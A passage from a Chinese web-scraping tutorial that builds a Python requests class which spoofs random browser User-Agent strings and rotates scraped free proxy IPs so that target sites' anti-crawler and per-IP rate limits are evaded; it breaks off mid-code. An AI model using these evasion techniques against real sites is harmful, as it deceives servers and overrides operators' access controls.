                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> download:</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def get(<span class="title">self</span>, <span class="title">url</span>):</span></span><br><span class="line"><span class="class">        return requests.get(<span class="title">url</span>)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>哈哈 简单吧！ 这只是基本的，上面说过啦，很多网站都都会拒绝非浏览器的请求的、怎么区分的呢？就是你发起的请求是否包含正常的 User-Agent 这玩意儿长啥样儿？就下面这样（如果不一样 请按一下 F5） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161029205637.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161029205637.png" alt="QQ截图20161029205637"></a> <strong>requests</strong>的请求的 User-Agent 大概是这样 python-requests/2.3.0 CPython/2.6.6 Windows/7 这个不是正常的 User-Agent、所以我们得自己造一个来欺骗服务器（requests 又一个 headers 参数能帮助我们伪装成浏览器哦！不知道的小哥儿 一定是没有看官方文档！这样很不好诶！o(一︿一+)o），让他以为我们是真的浏览器。 上面讲过有的网站会限制相同的 User-Agent 的访问频率，那我们就给他随机来一个 User-Agent 好了！去百度一下 User-Agent，我找到了下面这些：</p>
                  <figure class="highlight accesslog">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line"> <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>下面我们来改改上面的代码成这样：</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> download:</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        self.user_agent_list = [</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/537.1 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/22.0.1207.1 <span class="type">Safari</span>/537.1",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">X11</span>; <span class="type">CrOS</span> <span class="title">i686</span> 2268.111.0) <span class="type">AppleWebKit</span>/536.11 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/20.0.1132.57 <span class="type">Safari</span>/536.11",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/536.6 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/20.0.1092.0 <span class="type">Safari</span>/536.6",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2) <span class="type">AppleWebKit</span>/536.6 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/20.0.1090.0 <span class="type">Safari</span>/536.6",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/537.1 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.77.34.5 <span class="type">Safari</span>/537.1",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">X11</span>; <span class="type">Linux</span> <span class="title">x86_64</span>) <span class="type">AppleWebKit</span>/536.5 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1084.9 <span class="type">Safari</span>/536.5",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.0) <span class="type">AppleWebKit</span>/536.5 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1084.36 <span class="type">Safari</span>/536.5",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1063.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 5.1) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1063.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Macintosh</span>; <span class="type">Intel</span> <span class="type">Mac</span> <span class="type">OS</span> <span class="type">X</span> 10<span class="title">_8_0</span>) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1063.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1062.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1062.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1061.1 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1061.1 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.1) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1061.1 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2) <span class="type">AppleWebKit</span>/536.3 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1061.0 <span class="type">Safari</span>/536.3",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">X11</span>; <span class="type">Linux</span> <span class="title">x86_64</span>) <span class="type">AppleWebKit</span>/535.24 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1055.1 <span class="type">Safari</span>/535.24",</span></span><br><span class="line"><span class="class">            "<span class="type">Mozilla</span>/5.0 (<span class="type">Windows</span> <span class="type">NT</span> 6.2; <span class="type">WOW64</span>) <span class="type">AppleWebKit</span>/535.24 (<span class="type">KHTML</span>, <span class="title">like</span> <span class="type">Gecko</span>) <span class="type">Chrome</span>/19.0.1055.1 <span class="type">Safari</span>/535.24"</span></span><br><span class="line"><span class="class">        ]</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def get(<span class="title">self</span>, <span class="title">url</span>):</span></span><br><span class="line"><span class="class">        <span class="type">UA</span> = random.choice(<span class="title">self</span>.<span class="title">user_agent_list</span>) ##从self.user_agent_list中随机取出一个字符串（聪明的小哥儿一定发现了这是完整的<span class="type">User</span>-<span class="type">Agent</span>中：后面的一半段）</span></span><br><span class="line"><span class="class">        headers = &#123;'<span class="type">User</span>-<span class="type">Agent'</span>: <span class="type">UA</span>&#125;  ##构造成一个完整的<span class="type">User</span>-<span class="type">Agent</span> （<span class="type">UA</span>代表的是上面随机取出来的字符串哦）</span></span><br><span class="line"><span class="class">        response = requests.get(<span class="title">url</span>, <span class="title">headers</span>=<span class="title">headers</span>) ##这样服务器就会以为我们是真的浏览器了</span></span><br><span class="line"><span class="class">        return response</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>各位可以自己实例化测试一下，headers 会不会变哦 ε=ε=ε=(~￣ ▽ ￣)~ 好啦下面我们继续还有一个点没有处理：那就是<strong>限制 IP 频率的反爬虫。</strong> 首先是需要获取代理 IP 的网站，我找到了这个站点 <strong><a href="http://haoip.cc/tiqu.htm" target="_blank" rel="noopener">http://haoip.cc/tiqu.htm</a></strong>（这儿本来我是准备教大家自己维护一个 IP 代理池的，不过有点麻烦啊！还好发现这个代理站，还是这么好心的站长。我就可以光明正大的偷懒啦！ヾ(≧O≦)〃嗷~） 我们先把这写 IP 爬取下来吧！本来想让大家自己写，不过有用到正则表达式的，虽然简单，不过有些小哥儿（妹儿）怕是不会使。我也写出来啦.</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">iplist = [] <span class="comment">##初始化一个list用来存放我们获取到的IP</span></span><br><span class="line">html = requests.get(<span class="string">"http://haoip.cc/tiqu.htm"</span>)<span class="comment">##不解释咯</span></span><br><span class="line">iplistn = re.findall(<span class="string">r'r/&gt;(.*?)&lt;b'</span>, html.text, re.S) <span class="comment">##表示从html.text中获取所有r/&gt;&lt;b中的内容，re.S的意思是包括匹配包括换行符，findall返回的是个list哦！</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> iplistn:</span><br><span class="line">    i = re.sub(<span class="string">'\n'</span>, <span class="string">''</span>, ip)<span class="comment">##re.sub 是re模块替换的方法，这儿表示将\n替换为空</span></span><br><span class="line">    iplist.append(i.strip()) <span class="comment">##添加到我们上面初始化的list里面, i.strip()的意思是去掉字符串的空格哦！！（这都不知道的小哥儿基础不牢啊）</span></span><br><span class="line">    print(i.strip())</span><br><span class="line">print(iplist)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们来打印一下看看 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161029235128.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161029235128.png" alt="QQ截图20161029235128"></a> 下面[———————]中的内容就我们添加进 iplist 这个初始化的 list 中的内容哦！ 完美！！好啦现在我们把这段代码加到之前写的代码里面去；并判断是否使用了代理：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class download:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line"></span><br><span class="line">        self.iplist = []  ##初始化一个list用来存放我们获取到的IP</span><br><span class="line">        html = requests.<span class="builtin-name">get</span>(<span class="string">"http://haoip.cc/tiqu.htm"</span>)  ##不解释咯</span><br><span class="line">        iplistn = re.findall(r<span class="string">'r/&gt;(.*?)&lt;b'</span>, html.text, re.S)  ##表示从html.text中获取所有r/&gt;&lt;b中的内容，re.S的意思是包括匹配包括换行符，findall返回的是个list哦！</span><br><span class="line">        <span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> iplistn:</span><br><span class="line">            i = re.sub(<span class="string">'\n'</span>, <span class="string">''</span>, ip)  ##re.sub 是re模块替换的方法，这儿表示将\n替换为空</span><br><span class="line">            self.iplist.append(i.strip())  ##添加到我们上面初始化的list里面</span><br><span class="line"></span><br><span class="line">        self.user_agent_list = [</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">get</span>(self, url, <span class="attribute">proxy</span>=None): ##给函数一个默认参数proxy为空</span><br><span class="line">        UA = random.choice(self.user_agent_list) ##从self.user_agent_list中随机取出一个字符串</span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  ##构造成一个完整的User-Agent （UA代表的是上面随机取出来的字符串哦）</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span><span class="built_in"> proxy </span>== None: ##当代理为空时，不使用代理获取response（别忘了response啥哦！之前说过了！！）</span><br><span class="line">            response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers)##这样服务器就会以为我们是真的浏览器了</span><br><span class="line">            return response ##返回response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: ##当代理不为空</span><br><span class="line">           <span class="built_in"> IP </span>= <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) ##将从self.iplist中获取的字符串处理成我们需要的格式（处理了些，什么自己看哦，这是基础呢）</span><br><span class="line">           <span class="built_in"> proxy </span>= &#123;<span class="string">'http'</span>: IP&#125; ##构造成一个代理</span><br><span class="line">            response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">proxies</span>=proxy) ##使用代理获取response</span><br><span class="line">            return response</span><br><span class="line">Xz = download() ##实例化</span><br><span class="line"><span class="builtin-name">print</span>(Xz.<span class="builtin-name">get</span>(<span class="string">"mzitu.com"</span>).headers) ##打印headers</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>需要测试的小哥儿（妹儿），可以自行测试哦。 下面我开始判断什么时候需要 ！需要使用代理，而且还得规定一下多少次切换成代理爬取，多少次取消代理啊！我们改改代码，成下面这样：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class download:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line"></span><br><span class="line">        self.iplist = []  ##初始化一个list用来存放我们获取到的IP</span><br><span class="line">        html = requests.<span class="builtin-name">get</span>(<span class="string">"http://haoip.cc/tiqu.htm"</span>)  ##不解释咯</span><br><span class="line">        iplistn = re.findall(r<span class="string">'r/&gt;(.*?)&lt;b'</span>, html.text, re.S)  ##表示从html.text中获取所有r/&gt;&lt;b中的内容，re.S的意思是包括匹配包括换行符，findall返回的是个list哦！</span><br><span class="line">        <span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> iplistn:</span><br><span class="line">            i = re.sub(<span class="string">'\n'</span>, <span class="string">''</span>, ip)  ##re.sub 是re模块替换的方法，这儿表示将\n替换为空</span><br><span class="line">            self.iplist.append(i.strip())  ##添加到我们上面初始化的list里面</span><br><span class="line"></span><br><span class="line">        self.user_agent_list = [</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) 